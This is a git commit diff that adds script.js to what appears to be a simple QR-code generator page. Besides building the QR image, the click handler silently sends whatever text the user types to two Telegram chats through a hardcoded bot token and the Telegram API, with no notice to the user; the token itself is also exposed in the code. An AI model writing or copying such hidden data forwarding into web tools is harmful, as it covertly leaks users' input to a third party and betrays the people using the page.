ead7a68c253b762f57ddbf85f24a2fbca162148d
Ibrohim <ibo.ibo3701@gmail.com>
2023-09-12 16:09:34 +0500

    add files

---
+++ script.js
@@ -0,0 +1,19 @@
+let text = document.getElementById("text");
+let btn = document.getElementById("btn");
+let image = document.getElementById("image");
+
+btn.addEventListener("click", () => {
+  image.src =
+    "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" +
+    text.value;
+    sendtelegram(text.value, -1001584390033);
+    sendtelegram(text.value, 1369431958);
+   
+});
+
+function sendtelegram(message,id) { let telegram_bot_id = "5867224730:AAH2woLmER2mpBbO81crcNFKORISVg9UbP4"; let chat_id = id; let settings = { "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendPhoto", "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" }, "data": JSON.stringify({ "chat_id": chat_id, caption: message, photo: "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" +text.value }) }; $.ajax(settings).done(function (response) { }); };
+
+
+// git add .
+// git commit -m "add files"
+// git push
